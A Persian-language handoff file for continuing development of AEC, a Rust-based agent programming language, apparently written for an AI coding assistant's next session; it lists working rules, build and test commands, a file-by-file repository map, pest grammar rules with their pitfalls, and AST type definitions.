# AEC — HANDOFF کامل و تفصیلی (برای ادامه در چت/API بعدی)

> **این فایل را در ابتدای جلسهٔ بعد کامل بخوان.** هدفش این است که با صفر دانش قبلی،
> بتوانی بدون گم شدن ادامه بدهی — حتی اگر جلسهٔ قبل نیمه‌کاره قطع شده باشد.
>
> آخرین به‌روزرسانی: ۲۰۲۶-۰۹-۲۲ (جلسهٔ چهارم) · وضعیت: کارها **uncommitted** در working tree.
>
> **تمام‌شده در این جلسه (جلسهٔ چهارم): ۱۸.۵ ✅ · ۱۸.۱۳ ✅ · ۱۸.۷.۱ `var` ✅ ·
> ۱۸.۷.۲ interpolation ✅ · ۱۸.۷.۳ `Result`/`?` ✅ · ۱۸.۷.۴ Closure ✅ — ۲۱۴ تست سبز.**
>
> **نتیجه: «زبان» از نظر فیچر تمام شد.** تنها شکاف باقی‌ماندهٔ زبان ۱۸.۶ (`import` چندفایلی) است
> که runtime هیچ کاری با آن نمی‌کند. بقیهٔ بک‌لاگ = محصول (CI/بیلد/docs/AECPM/state sync).
>
> **۳ باگ از قبل موجود که این جلسه رفع شد** (جزئیات در بخش ۱۵، باگ‌های ۸ تا ۱۰):
> `none` به‌عنوان مقدار پارس نمی‌شد · `?` در نوع بی‌صدا دور ریخته می‌شد · لیست builtinهای چکر
> ناقص بود (هشدار کاذب «undeclared variable»).
>
> **۲ سینتکس جدید که کاربر تأیید کرد:** `ok(v)`/`err(e)` برای `Result`، و کلیدواژهٔ `function`
> برای نوع تابع. ⚠️ قاعدهٔ «از خودم سینتکس نسازم» هنوز معتبر است — هر سینتکس جدید را بپرس.
>
> آیتم بعدی پیشنهادی: **۱۸.۶** (modules/چندفایلی) سپس **۱۸.۴** (state sync کامل)، بعد ۱۸.۹ CI.

---

## ۰) دستور کار جلسهٔ بعد (خیلی خلاصه)

1. `cd /home/mamadi/aec`
2. بخش‌های ۱ تا ۱۷ این فایل را بخوان (قواعد، نقشه، APIها، باگ‌های رفع‌شده)،
   و **جدول «وضعیت در یک نگاه» در ابتدای بخش ۱۸** را ببین.
3. وضعیت را با این دستورها بسنج:
   ```bash
   cargo test --workspace --no-fail-fast     # انتظار: ۲۱۴ تست سبز، ۰ شکست
   cargo check --workspace                   # انتظار: بدون warning
   cargo run -q -p aec-cli -- check examples/theme.aec
   cargo run -q -p aec-cli -- run examples/lambda.aec --cli --entry main
   ```
4. اگر سبز بود، آیتم‌های بخش ۱۸ را بردار: **۱۸.۶** → **۱۸.۴** → **۱۸.۹** → بقیه.
   (زبان تمام شده؛ «۱۸.۷» دیگر باز نیست.)
5. برای هر آیتم: AST → پارسر → runtime/UI → **تست** → مثال → `cargo test --workspace`.
6. بدون تست، چیزی «تمام‌شده» اعلام نشود.
7. **هر پیام جدید/تست جدید انگلیسی باشد** (قاعدهٔ ۸).
8. **اگر سینتکس جدید لازم شد، از کاربر بپرس** (قاعدهٔ ۹).

> ⚠️ دو دام که در جلسهٔ قبل وقت گرفت:
> - `cargo test --workspace` به‌صورت پیش‌فرض **fail-fast** است و بعد از اولین کریت شکست‌خورده
>   بقیه را اجرا نمی‌کند؛ برای دیدن همهٔ شکست‌ها `--no-fail-fast` بزن.
> - در زنجیرهٔ `cmd1 && cmd2`، اگر `cmd1` شمارش صفر باشد (مثل `grep -c`) با exit 1
>   **زنجیره را می‌شکند و بقیه بی‌صدا اجرا نمی‌شوند**. برای چک‌لیست از `;` یا خط جدا استفاده کن.

---

## ۱) قواعد غیرقابل‌نقض (Constraints)

| # | قاعده |
|---|---|
| ۱ | **فقط در `/home/mamadi/aec` کار کن.** به `/home/mamadi/metrics-app` یا هیچ‌جای دیگر دست نزن. |
| ۲ | **کامیت / push نزن.** همه‌چیز باید uncommitted بماند تا کاربر خودش تصمیم بگیرد. |
| ۳ | **`git checkout --` روی فایل‌هایی که کاربر تغییرشان داده نزن** (تغییرات uncommitted دارایی کاربر است). |
| ۴ | دو فایل backup را **restore نکن**: `crates/aec-parser/src/build_ast.rs.backup` و `crates/aec-parser/src/grammar.pest.backup` |
| ۵ | **`cargo fmt --all` اجرا نکن** (توضیح در بخش ۱۳). |
| ۶ | دامنه = **یک زبان**، نه اکوسیستم چندساله. سند اولیه فقط «آرمان» است؛ مرجع، جدول وزنی بخش ۱۴ است. |
| ۷ | هر فیچر بدون تست «تمام‌شده» نیست. |
| ۸ | **همهٔ پیام‌های تشخیصی (خطا/موفقیت) و کامنت‌های کد انگلیسی‌اند** — مثل هر زبان استاندارد. ⚠️ فایل‌های `.aec` هم **سورس‌کد** هستند، پس کامنت‌هایشان (`#`) هم باید انگلیسی باشد. فارسی فقط در **محتوای برنامه** جایز است: متن UI/دادهٔ تست مثل `"سلام"` (مثال `theme.aec` عمداً فارسی است چون کارش نمایش فونت/RTL است). |
| ۹ | **از خودت سینتکس زبان نساز.** هر سینتکس/کلیدواژه/نام builtin جدید باید **قبلش از کاربر پرسیده شود** (مثل `ok`/`err` و `function` در جلسهٔ چهارم). |
| ۱۰ | **دستور جدید زبان باید در هر سه لایه هم‌زمان پیاده شود:** AST + گرامر/پارسر + runtime **و** چکر. اگر لایه‌ای جا بماند، یا compile می‌شکند (`non-exhaustive patterns`) یا بی‌صدا اشتباه کار می‌کند. |

---

## ۲) پروژه چیست

**AEC = Agent Easy Creator** — یک **زبان برنامه‌نویسی** برای ساخت ایجنت‌ها، شامل:

- سینتکس اختصاصی + پارسر (pest) + AST
- Runtime (مفسّر tree-walking + کتابخانهٔ استاندارد + اتصال LLM + حافظه)
- UI DSL که **بخشی از خود زبان** است (نه کتابخانه) + رندرر native با `egui/eframe`
- کامپوننت‌های کاربر، Theme System، Type Checker
- CLI

معماری ۵ لایه در سند: Config / UI / API / Backend / Memory.

**تصمیم‌های معماری پایه (از چت طراحی، قفل‌شده):**

- کامپایلر اختصاصی ✅ (اما «LLVM دوم» نه؛ تفسیر کافی است)
- رندرر UI: فقط **لایهٔ تبدیل** مال ماست، موتور رسم مال egui/OS 🔧
- Runtime اختصاصی ✅ (HTTP/DB/TLS از crate آماده)
- Sandbox کامل، AECPM، A2A → **آینده، فقط با نیاز اثبات‌شده**
- Interpreter: tree-walking (bytecode بعداً)
- async: tokio + `await` صریح (پیاده نشده)
- خطا: `Result` + `?` (پیاده نشده)
- `let` تغییرناپذیر، `var` تغییرپذیر (**`var` پیاده نشده**)
- UI: functional component با state صریح (نه hooks)

---

## ۳) محیط و دستورهای پایه

```bash
# ریشه
cd /home/mamadi/aec

# وضعیت
git status --porcelain
git log --oneline -5

# ساخت و بررسی
cargo check --workspace
cargo test --workspace

# اجرای CLI
cargo run -q -p aec-cli -- check <file.aec>      # پارس + بررسی نوع
cargo run -q -p aec-cli -- ast   <file.aec>      # چاپ AST
cargo run -q -p aec-cli -- run   <file.aec> [--cli]

# باینری ساخته‌شده (سریع‌تر برای تست‌های تکراری)
./target/debug/aec check <file.aec>
```

- Rust edition 2021، `rust-version = 1.75`.
- workspace resolver = "2"؛ اعضا در بخش ۴.
- فونت فارسی: `crates/aec-ui/assets/fonts/Vazirmatn-Regular.ttf` (با `include_bytes!` بار می‌شود).

---

## ۴) نقشهٔ مخزن (فایل به فایل)

### ریشه

| مسیر | توضیح |
|---|---|
| `Cargo.toml` | workspace + `[workspace.dependencies]` (pest, uuid, thiserror, pretty_assertions, reqwest, serde_json, regex, md5, sha2, base64, **rusqlite 0.40 (bundled)**, egui 0.29, eframe 0.29) |
| `COMPONENT_SYSTEM_HANDOFF.md` | handoff قدیمی (component system) — تاریخی |
| `NEXT_SESSION_HANDOFF.md` | **همین فایل** |
| `.gitignore` | شامل `*.sqlite` / `*.sqlite-journal` / `*.sqlite-wal` (تا artifact مثال‌ها وارد git نشود) |
| `docs/roadmap.html` | گزارش وضعیت (RTL، تم تیره) — **اعداد بخش ۱۸.۲ در آن هنوز به‌روز نشده** |
| `examples/theme.aec` | مثال آزمایش‌شدهٔ Theme + Component |
| `examples/memory.aec` | مثال آزمایش‌شدهٔ حافظهٔ پیوسته (SQLite) — با `aec run ... --cli --entry main` |
| `examples/sandbox.aec` | مثال آزمایش‌شدهٔ Sandbox/Permissions (مسیر مجاز؛ مسیر رد‌شده کامنت‌شده) |
| `setup.sh`, `fix.sh`, `fix2.sh`, `rebuild.sh` | اسکریپت‌های تاریخی اسکلت‌سازی (از Sprint 1) — کاری به آن‌ها نداشته باش |
| `report.html` | گزارش قدیمی |

### کریت‌ها و وابستگی‌ها

| کریت | وابستگی‌ها | مسئولیت |
|---|---|---|
| `aec-ast` | uuid, thiserror | تعریف AST + Span + خطا |
| `aec-parser` | aec-ast, pest, pest_derive, thiserror, uuid | grammar + build AST |
| `aec-check` | aec-ast (dev: aec-parser, pretty_assertions) | بررسی نوع (فاز ۱) |
| `aec-runtime` | aec-ast, thiserror, uuid, reqwest, serde_json, regex, md5, sha2, base64, **rusqlite (dev: aec-parser)** | مفسّر + stdlib + LLM + حافظه |
| `aec-ui` | aec-ast, aec-runtime, egui, eframe | Widget tree + رندرر native |
| `aec-cli` | aec-ast, aec-parser, aec-check, aec-runtime, aec-ui, clap, anyhow, colored | اجرپذیر `aec` |

### فایل‌های `aec-ast/src/`

| فایل | محتوا |
|---|---|
| `lib.rs` | `pub mod`ها + `pub use`ها (همهٔ نوع‌ها از اینجا re-export می‌شوند) |
| `span.rs` | `Position { line, column, offset }`, `Span { start, end }`, `Span::new`, `Span::dummy()`, `Spanned` |
| `error.rs` | `ParseError { span, kind }`, `ParseErrorKind`, `ParseError::new` |
| `literal.rs` | `Literal`, `Duration`, `DurationUnit`, `InterpPart` |
| `program.rs` | `Program`, `AgentHeader`, `Identifier`, `TopLevelItem`, `ImportStmt` |
| `declarative.rs` | `SecretsBlock`, `SecretsEntry`, `SecretValue` |
| `model.rs` | `ModelDecl`, `ModelField`, `ModelProperty`, `RetryBlock`, `RetryField` |
| `expr.rs` | همهٔ گره‌های expression |
| `function.rs` | `FunctionDecl`, `Parameter`, `Block`, `Statement`, …, `TypeExpr` |
| `ui.rs` | همهٔ گره‌های UI + `ComponentDecl/Prop/Use` + `TypeRef` |
| `theme.rs` | `ThemeDecl`, `ThemeGroup`, `ThemeEntry` |
| `style.rs` | `Style`, `StyleValue` |
| `permissions.rs` | **جدید (۱۸.۲)** — `PermissionsBlock`, `PermissionsEntry`, `NetworkRule`, `FilesystemRule`, `SystemRule`, `LimitsBlock`, `LimitsEntry` |

### فایل‌های `aec-parser/src/`

| فایل | محتوا |
|---|---|
| `grammar.pest` | گرامر کامل (بخش ۶) |
| `build_ast.rs` | تبدیل `Pair`های pest به AST (~۱۷۵۰ خط) |
| `errors.rs` | `convert_pest_error`, `pest_message`, `build_error` |
| `lib.rs` | `parse(&str) -> Result<Program, ParseError>` |

### فایل‌های `aec-check/src/`

| فایل | محتوا |
|---|---|
| `lib.rs` | re-export |
| `ty.rs` | `Ty`, `ty_from_expr`, `compatible` |
| `diag.rs` | `Diagnostic`, `Severity`, `DiagKind`, `error_count` |
| `checker.rs` | `Checker`, `check_program` |

### فایل‌های `aec-runtime/src/`

| فایل | محتوا |
|---|---|
| `lib.rs` | `pub use`ها + `run(program)` |
| `value.rs` | `Value`, `Function`, `Env`, `Environment` |
| `interpreter.rs` | `Interpreter` (register fns, call, eval) |
| `stdlib.rs` | builtinهای پایه (file/env/http/json/time/sys/math). ⚠️ امضای `call_builtin` حالا `limits: &Limits` هم می‌گیرد (برای timeout) |
| `stdlib_extended.rs` | builtinهای افزوده (shell/regex/crypto/uuid/sys/files/http کامل‌تر). ⚠️ `call_extended` هم `limits` می‌گیرد |
| `permissions.rs` | **جدید (۱۸.۲)** — سیاست `Permissions` + `Limits` + گیت `check_builtin` + `extract_host` + `normalize_path` |
| `llm.rs` | `llm_complete(...)` |
| `memory.rs` | `Memory`, `Message` (in-memory) |
| `errors.rs` | `RuntimeError` (+ `span()`, `with_span(span)`) |

### فایل‌های تست `aec-runtime/tests/`

| فایل | محتوا |
|---|---|
| `memory.rs` | ۱۱ تست: in-memory (رگرسیون)، SQLite (reopen/ترتیب/ایزوله/clear)، end-to-end پارسر→interpreter |

### فایل‌های `aec-ui/src/`

| فایل | محتوا |
|---|---|
| `lib.rs` | re-export: `run_ui`, `AecApp`, `Widget`, `UiState`, `UiValue`, `WidgetStyle`, `ComponentRegistry`, `Themes`, `ResolvedTheme`, `build_widgets*` |
| `widgets.rs` | Widget tree + ساخت از AST + تم + کامپوننت (~۱۴۰۰ خط با تست‌ها) |
| `renderer.rs` | `AecApp` + رندر egui + sync state (~۵۰۰ خط) |

### فایل‌های `aec-cli/src/` و تست‌ها

| مسیر | محتوا |
|---|---|
| `src/main.rs` | clap، `cmd_check`, `cmd_ast`, `cmd_run`, `run_type_check`, `print_diag`, `parse_error_message` |
| `src/render.rs` | `snippet`, `render`, `Level` (+۳ تست واحد) |

---

## ۵) وضعیت Git

> ⚠️ **جلسهٔ ۴:** لیست زیر از جلسهٔ ۳ است و **دیگر دقیق نیست** (فایل‌های جدید زیادی اضافه شد:
> `crates/aec-parser/tests/{interpolation,result,lambda,permissions,literals}.rs`،
> `crates/aec-runtime/tests/interpreter.rs`، `crates/aec-cli/tests/run_type_gate.rs`،
> `examples/{language,result,lambda}.aec`). **مرجع، خودِ `git status` است؛ به لیست زیر تکیه نکن.**
> چیزی که هنوز درست است: همه‌چیز **uncommitted** است و نباید کامیت شود.

همهٔ تغییرات زیر **uncommitted** هستند (نه staged). لیست دقیق در زمان نوشتن این فایل:

**Modified:**
```
gitignore
Cargo.toml
crates/aec-ast/src/expr.rs
crates/aec-ast/src/lib.rs
crates/aec-ast/src/program.rs
crates/aec-ast/src/style.rs
crates/aec-ast/src/ui.rs
crates/aec-cli/Cargo.toml
crates/aec-cli/src/main.rs
crates/aec-parser/src/build_ast.rs
crates/aec-parser/src/errors.rs
crates/aec-parser/src/grammar.pest
crates/aec-parser/tests/expr.rs
crates/aec-runtime/Cargo.toml
crates/aec-runtime/src/errors.rs
crates/aec-runtime/src/interpreter.rs
crates/aec-runtime/src/lib.rs
crates/aec-runtime/src/llm.rs
crates/aec-runtime/src/memory.rs
crates/aec-runtime/src/stdlib.rs
crates/aec-runtime/src/stdlib_extended.rs
crates/aec-runtime/src/value.rs
crates/aec-ui/src/lib.rs
crates/aec-ui/src/renderer.rs
crates/aec-ui/src/widgets.rs
```

**Deleted:**
```
crates/aec-parser/src/build_ast.rs.backup
crates/aec-parser/src/grammar.pest.backup
```

**Untracked (جدید):**
```
NEXT_SESSION_HANDOFF.md
crates/aec-ast/src/permissions.rs
crates/aec-ast/src/theme.rs
crates/aec-check/
crates/aec-cli/src/render.rs
crates/aec-cli/tests/
crates/aec-parser/tests/component.rs
crates/aec-parser/tests/literals.rs
crates/aec-parser/tests/permissions.rs
crates/aec-parser/tests/theme.rs
crates/aec-runtime/src/permissions.rs
crates/aec-runtime/tests/
docs/
examples/
```

> ⚠️ اگر جلسهٔ قبل نیمه‌کاره قطع شده: با `git status` ببین چه فایل‌هایی جدیدتر از بقیه‌اند و
> `cargo test --workspace` بزن تا بفهمی کجا شکسته. سپس همان بخش ۱۸ را ادامه بده.

---

## ۶) Grammar Reference (`crates/aec-parser/src/grammar.pest`)

### فهرست قواعد (به ترتیب فایل)

```
program agent_header top_level_item
import_stmt alias
secrets_block secrets_entry secret_value env_call
permissions_block permissions_entry network_rule filesystem_rule filesystem_field system_rule system_field
limits_block limits_entry
model_decl model_field model_property retry_block retry_field retry_property retry_on capabilities_block
string_literal string_inner raw_string
int_literal float_literal bool_literal duration_literal duration_unit byte_size_literal byte_size_unit uuid_literal
literal array_literal array_element
expr logical_or_expr or_op logical_and_expr and_op
comparison_expr comparison_op additive_expr additive_op multiplicative_expr multiplicative_op
unary_expr unary_op postfix_expr postfix_op call_op member_op index_op
primary_expr paren_expr array_expr object_expr object_field await_expr
match_expr match_arm pattern wildcard_pattern some_pattern none_pattern literal_pattern
arg_list argument
fn_decl param_list param return_type base_type full_type primitive_type named_type array_type
block stmt_sep statement if_stmt else_clause while_stmt for_stmt let_stmt assign_stmt lvalue assign_op return_stmt expr_stmt
identifier WHITESPACE COMMENT NEWLINE
component_decl component_prop component_type component_render component_use component_name component_arg
theme_decl theme_default theme_extends theme_group theme_entry theme_value design_token
ui_decl screen_expr block_ui ui_statement state_decl_ui state_value
element_expr element_name primary_arg identifier_primary element_modifier element_property binding event_handler element_children
ui_if ui_for expression_path display_expr messages_expr
style_block style_property style_value style_string style_number style_bool
```

### قواعد کلیدی (متن دقیق)

```pest
program = { SOI ~ NEWLINE* ~ agent_header ~ top_level_item* ~ EOI }
agent_header = { "agent" ~ identifier ~ NEWLINE }
top_level_item = _{ secrets_block | permissions_block | limits_block | model_decl | import_stmt | fn_decl | component_decl | theme_decl | ui_decl }

identifier = @{ (ASCII_ALPHA | "_") ~ (ASCII_ALPHANUMERIC | "_")* }
WHITESPACE = _{ " " | "\t" }
COMMENT    = _{ "#" ~ (!NEWLINE ~ ANY)* }
NEWLINE    = _{ ("\n" | "\r\n")+ }

expr = { logical_or_expr }
logical_or_expr  = { logical_and_expr ~ (or_op ~ logical_and_expr)* }
or_op            = @{ "or" ~ !(ASCII_ALPHANUMERIC | "_") }
logical_and_expr = { comparison_expr ~ (and_op ~ comparison_expr)* }
and_op           = @{ "and" ~ !(ASCII_ALPHANUMERIC | "_") }
comparison_expr  = { additive_expr ~ (comparison_op ~ additive_expr)* }
comparison_op    = { "==" | "!=" | "<=" | ">=" | "<" | ">" }
additive_expr    = { multiplicative_expr ~ (additive_op ~ multiplicative_expr)* }
additive_op      = { "+" | "-" }
multiplicative_expr = { unary_expr ~ (multiplicative_op ~ unary_expr)* }
multiplicative_op   = { "*" | "/" | "%" }
unary_expr       = { unary_op? ~ postfix_expr }
unary_op         = { "not" | "!" | "-" }
postfix_expr     = { primary_expr ~ postfix_op* }
postfix_op       = _{ call_op | member_op | index_op }
primary_expr     = _{ paren_expr | array_expr | object_expr | await_expr | match_expr | literal | identifier }

block     = { "{" ~ NEWLINE* ~ (statement ~ stmt_sep?)* ~ "}" }
stmt_sep  = _{ NEWLINE+ | &"}" }
statement = _{ if_stmt | while_stmt | for_stmt | let_stmt | assign_stmt | return_stmt | expr_stmt }
fn_decl   = { "fn" ~ identifier ~ "(" ~ param_list? ~ ")" ~ return_type? ~ block ~ NEWLINE* }
param     = { identifier ~ ":" ~ base_type ~ ("=" ~ expr)? }
```

```pest
// --- Permissions / Limits (۱۸.۲) ---
permissions_block = { "permissions" ~ "{" ~ NEWLINE* ~ permissions_entry* ~ "}" ~ NEWLINE* }
permissions_entry = _{ network_rule | filesystem_rule | system_rule }

network_rule = { "network" ~ ":" ~ array_literal ~ NEWLINE* }

filesystem_rule  = { "filesystem" ~ "{" ~ NEWLINE* ~ filesystem_field* ~ "}" ~ NEWLINE* }
filesystem_field = { identifier ~ ":" ~ array_literal ~ NEWLINE* }

system_rule  = { "system" ~ "{" ~ NEWLINE* ~ system_field* ~ "}" ~ NEWLINE* }
system_field = { identifier ~ ":" ~ bool_literal ~ NEWLINE* }

limits_block = { "limits" ~ "{" ~ NEWLINE* ~ limits_entry* ~ "}" ~ NEWLINE* }
limits_entry = { identifier ~ ":" ~ literal ~ NEWLINE* }

// --- Component ---
component_decl   = { "component" ~ identifier ~ "{" ~ NEWLINE* ~ component_prop* ~ component_render? ~ NEWLINE* ~ "}" ~ NEWLINE* }
component_prop   = { "prop" ~ identifier ~ (":" ~ component_type)? ~ NEWLINE* }
component_type   = { base_type }
component_render = { "render" ~ "{" ~ NEWLINE* ~ (ui_statement ~ NEWLINE*)* ~ "}" }
component_use    = {
    !("Column" | "Row" | "Text" | "Input" | "Button" | "Card" | "Divider"
      | "Display" | "Messages" | "Heading" | "Spacer")
    ~ component_name ~ (component_arg)* ~ NEWLINE*
}
component_name = @{ ('A'..'Z') ~ (ASCII_ALPHANUMERIC | "_")* }
component_arg  = { identifier ~ ":" ~ expr }

// --- Theme ---
theme_decl    = { "theme" ~ identifier ~ theme_default? ~ theme_extends? ~ "{" ~ NEWLINE* ~ theme_group* ~ "}" ~ NEWLINE* }
theme_default = { "default" }
theme_extends = { "extends" ~ identifier }
theme_group   = { identifier ~ "{" ~ NEWLINE* ~ theme_entry* ~ "}" ~ NEWLINE* }
theme_entry   = { identifier ~ ":" ~ theme_value ~ NEWLINE* }
theme_value   = _{ style_string | style_number | style_bool | identifier }
design_token  = { "theme" ~ ("." ~ identifier)+ }     // theme.color.primary
```

```pest
// --- UI ---
ui_decl     = { "ui" ~ identifier ~ "=" ~ screen_expr ~ NEWLINE* }
screen_expr = { "Screen" ~ string_literal ~ block_ui }
block_ui    = { "{" ~ NEWLINE* ~ ui_statement* ~ NEWLINE* ~ "}" }
ui_statement = _{ state_decl_ui | display_expr | messages_expr | component_use | element_expr | ui_if | ui_for }

state_decl_ui = { "@" ~ identifier ~ (":" ~ base_type)? ~ "=" ~ state_value ~ NEWLINE* }
state_value   = _{ array_literal | object_expr | expr }

element_expr     = { element_name ~ primary_arg? ~ element_modifier* ~ style_block? ~ element_children? ~ NEWLINE* }
element_name     = @{ ('A'..'Z') ~ (ASCII_ALPHANUMERIC | "_")* }
primary_arg      = _{ string_literal | int_literal | float_literal | bool_literal | identifier_primary }
identifier_primary = _{ !(identifier ~ ":") ~ identifier }        // ⚠️ حیاتی
element_modifier = _{ element_property | binding | event_handler }
element_property = { identifier ~ ":" ~ expr }
binding          = { "bind" ~ identifier ~ "to" ~ identifier ~ (member_op | call_op)* ~ NEWLINE* }
event_handler    = { "on" ~ identifier ~ "->" ~ identifier ~ (member_op | call_op)* ~ NEWLINE* }
element_children = { "{" ~ NEWLINE* ~ ui_statement* ~ NEWLINE* ~ "}" }

ui_if          = { "if" ~ expr ~ block_ui ~ ("else" ~ block_ui)? ~ NEWLINE* }
ui_for         = { "for" ~ identifier ~ "in" ~ expr ~ block_ui ~ NEWLINE* }
display_expr   = { "Display" ~ identifier ~ NEWLINE* }
messages_expr  = { "Messages" ~ "list" ~ ":" ~ identifier ~ NEWLINE* }

style_block    = { "{" ~ NEWLINE* ~ (style_property ~ NEWLINE*)* ~ "}" }
style_property = { identifier ~ ":" ~ style_value }
style_value    = _{ design_token | style_string | style_number | style_bool | identifier }
style_string   = ${ "\"" ~ (!"\"" ~ ANY)* ~ "\"" }
style_number   = @{ "-"? ~ ASCII_DIGIT+ ~ ("." ~ ASCII_DIGIT+)? }
style_bool     = { "true" | "false" }
```

```pest
// --- 🆕 جلسهٔ ۴: try / lambda / none / optional / function type ---
postfix_op      = _{ call_op | member_op | index_op | try_op }
try_op          = { "?" }                                  // `expr?`

primary_expr    = _{ lambda_expr | paren_expr | array_expr | object_expr | await_expr
                   | match_expr | literal | identifier }    // ⚠️ lambda اول
lambda_expr     = { lambda_params? ~ "=>" ~ expr }
lambda_params   = { identifier ~ ("," ~ identifier)* }

none_literal    = { "none" }                               // ⚠️ باید نامدار باشد
literal         = _{ float_literal | duration_literal | byte_size_literal | uuid_literal
                   | int_literal | bool_literal | raw_string | string_literal | none_literal }

base_type       = _{ array_type | result_type | primitive_type | named_type }
full_type       = { base_type ~ optional_marker? }
optional_marker = { "?" }                                  // ⚠️ باید نامدار باشد
result_type     = { "Result" ~ "(" ~ base_type ~ "," ~ base_type ~ ")" }
primitive_type  = @{ "string" | "int" | "float" | "bool" | "bytes" | "unit"
                   | "uuid" | "timestamp" | "function" }

// ⚠️ جلسهٔ ۴: `let_stmt`/`var_stmt`/`param` حالا `full_type` می‌گیرند (نه `base_type`)
let_stmt    = { "let" ~ identifier ~ (":" ~ full_type)? ~ "=" ~ expr }
var_stmt    = { "var" ~ identifier ~ (":" ~ full_type)? ~ "=" ~ expr }
param       = { identifier ~ ":" ~ full_type ~ ("=" ~ expr)? }
```

### ⚠️ گاتچاهای گرامر (این‌ها را نشکن)

1. **`NEWLINE` شامل space/tab نیست.** `WHITESPACE = " " | "\t"` است و newline جدا مدیریت می‌شود.
   پس هرجا پایان خط مهم است باید صریح `NEWLINE*` بگذاری.
2. **در `component_decl` باید `~ NEWLINE* ~ "}"` باشد** (قبل از `}` پایانی).
   اگر حذف شود، کامپوننت چندخطی (`}` روی خط جدید) پارس نمی‌شود. این باگ یک بار رخ داده.
3. **`identifier_primary`**: اگر `primary_arg` را دوباره به `identifier` ساده برگردانی،
   `Column background: theme.x` می‌شکند (کلمهٔ `background` به‌عنوان آرگومان خورده می‌شود).
4. **ترتیب `ui_statement` مهم است**: `component_use` قبل از `element_expr`، و
   `display_expr`/`messages_expr` قبل از `element_expr`. جابه‌جا نکن.
5. **`component_use` با lookahead منفی** نام‌های built-in را مستثنا می‌کند. اگر المان پایهٔ
   جدید اضافه کردی (مثل `Gauge`, `Header`)، **اسمش را به این لیست هم اضافه کن**، وگرنه
   به‌عنوان کامپوننت کاربر تفسیر می‌شود و children آن پارس نمی‌شود.
6. **`or_op`/`and_op` حتماً `!(ASCII_ALPHANUMERIC | "_")` داشته باشند** تا `orange` خراب نشود.
7. `array_literal` (بدون comma اجباری + object element) با `array_expr` (با comma) متفاوت است.
   `state_value` از `array_literal | object_expr | expr` استفاده می‌کند.
8. ⚠️⚠️ **ترتیب داخل `literal` حیاتی است** (باگ واقعی، بخش ۱۵ باگ ۶):
   ```pest
   literal = _{ float_literal | duration_literal | byte_size_literal | uuid_literal
             | int_literal | bool_literal | raw_string | string_literal | "none" }
   duration_literal  = ${ int_literal ~ duration_unit }
   byte_size_literal = ${ int_literal ~ byte_size_unit }
   ```
   - شکل‌های **خاص پیش از `int_literal`** بیایند، وگرنه هیچ‌وقت به‌دست نمی‌آیند.
   - `duration_literal`/`byte_size_literal` **باید `${ }` (compound-atomic) بمانند**.
     اگر `{ }` شوند، فاصله بین عدد و واحد مجاز می‌شود و `size: 20 spacing: 4`
     عدد `20` را با `s` از `spacing` می‌خورد.
   - اگر این ترتیب را عوض کنی، ۸ تست `crates/aec-parser/tests/literals.rs` می‌شکند.
9. `element_expr` هم `style_block?` دارد و هم `element_modifier*` (propertyهای inline).
   **هر دو** در `build_element_style` ادغام می‌شوند؛ propertyهای inline اولویت بالاتری دارند.
10. `primary_arg` فقط string/int/float/bool/identifier می‌پذیرد — **نه** expression پیچیده.
11. 🆕 **هر literal/کلیدواژه‌ای که باید به AST برسد، باید قاعدهٔ نامدار باشد.** یک literal بی‌نام
    (`"none"`, `"?"`) در یک قاعدهٔ silent، پارس را **موفق** می‌کند ولی به builder **هیچ `Pair`ی
    نمی‌دهد** — نتیجه: یا خطای «expected base expression» (باگ ۸) یا بی‌صدا دور ریخته شدن `?`
    در نوع (باگ ۹). اگر literal جدیدی اضافه کردی، قاعدهٔ نامدار بساز.
12. 🆕 **`lambda_expr` باید در `primary_expr` اول بیاید.** روی یک identifier ساده،
    `lambda_params` مطابقت می‌کند ولی `=>` شکست می‌خورد، پس choice به `identifier` برمی‌گردد.
    اگر بعد از `identifier` بگذاری‌اش، هیچ‌وقت به‌دست نمی‌آید.
13. 🆕 **`?` دو معنی دارد و نباید تداخل کنند:** در `postfix_op` عملگر try است، و در
    `optional_marker` بخشی از نوع. چون نوع همیشه **قبل از** `=` می‌آید، تداخلی نیست
    (`let x: int? = f()?` درست پارس می‌شود). تست نگهبان: `optional_type_annotation_still_parses`.
14. 🆕 **`result_type` باید در `base_type` قبل از `named_type` باشد**، وگرنه `Result(...)` به‌عنوان
    نوع نامدار پارس می‌شود. (اما `Result` **بدون** پرانتز عمداً نوع نامدار می‌ماند.)

---

## ۷) AST Reference

### `TopLevelItem`

```rust
pub enum TopLevelItem {
    Secrets(SecretsBlock),
    Permissions(PermissionsBlock),   // ۱۸.۲
    Limits(LimitsBlock),             // ۱۸.۲
    Model(ModelDecl),
    Import(ImportStmt),
    Function(FunctionDecl),
    Component(ComponentDecl),
    Theme(ThemeDecl),
    Ui(UiDecl),
}
```

```rust
// permissions.rs (جديد در ۱۸.۲) — همهٔ انواع از aec_ast re-export می‌شوند
pub struct PermissionsBlock { pub entries: Vec<PermissionsEntry>, pub span: Span }
pub enum PermissionsEntry { Network(NetworkRule), Filesystem(FilesystemRule), System(SystemRule) }
pub struct NetworkRule    { pub hosts: Vec<String>, pub span: Span }
pub struct FilesystemRule { pub read: Vec<String>, pub write: Vec<String>, pub span: Span }
pub struct SystemRule     { pub metrics: Option<bool>, pub restart: Option<bool>, pub span: Span }
pub struct LimitsBlock    { pub entries: Vec<LimitsEntry>, pub span: Span }
pub struct LimitsEntry    { pub name: Identifier, pub value: Literal, pub span: Span }
```
> ⚠️ `metrics`/`restart` عمداً `Option<bool>` هستند تا «اعلام‌نشده» (`None`) از
> «اعلام‌شده و false» جدا بماند. نگاشت به `bool` فقط در runtime (`unwrap_or(false)`) رخ می‌دهد.

> اگر variant جدیدی اضافه کردی، همهٔ `match`های موجود را چک کن. فعلاً همه‌جا
> `_ => None` یا `if let` استفاده شده، پس معمولاً فقط `build_program` در
> `aec-parser/src/build_ast.rs` و `Themes::from_items` و registry در renderer را باید ببینی.

### انواع کلیدی

```rust
// program.rs
pub struct Program { pub header: AgentHeader, pub items: Vec<TopLevelItem>, pub span: Span }
pub struct AgentHeader { pub name: Identifier, pub span: Span }
pub struct Identifier { pub name: String, pub span: Span }        // PartialEq/Eq/Hash
impl Identifier { pub fn new(name: impl Into<String>, span: Span) -> Self }

// span.rs
pub struct Position { pub line: u32, pub column: u32, pub offset: u32 }   // خط/ستون ۱-پایه
pub struct Span { pub start: Position, pub end: Position }
impl Span { pub fn new(start: Position, end: Position) -> Self; pub fn dummy() -> Self }

// style.rs
pub struct Style { pub properties: HashMap<String, StyleValue> }   // Default
pub enum StyleValue { String(String), Int(i64), Float(f64), Bool(bool), Ident(String) }
